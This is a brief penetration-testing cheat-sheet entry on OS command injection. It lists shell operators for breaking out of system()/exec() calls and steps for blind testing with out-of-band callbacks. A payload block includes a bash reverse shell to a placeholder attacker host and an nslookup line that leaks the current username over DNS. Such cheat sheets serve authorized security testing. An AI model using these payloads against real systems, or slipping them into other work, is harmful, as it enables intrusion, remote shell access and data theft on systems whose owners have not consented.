# 04.04 OS Command Injection

> Break out of `system()`/`exec()` with `;`, `&&`, `|`, backticks, or `$()`; confirm blind variants via DNS/HTTP OOB callbacks.

## Overview

App passes user input to a shell (`system()`, `exec()`, `Runtime.exec()`). Inject with `;`, `&&`, `|`, backticks, $(). Blind variants confirmed via DNS/HTTP OOB callbacks.

## Steps

- **Test for blind** — `; sleep 5;` or pingback via Burp Collaborator/interactsh.
- **Identify chained operator** that works (some shells block `;`).
- **Read output via curl/nslookup OOB** if no direct echo.
- **Catch a reverse shell** as soon as you have direct stdout.

## Commands

### Inject payloads

```text
; id
&& id
| id
`id`
$(id)
; bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
; nslookup $(whoami).<LHOST>    # blind OOB
```
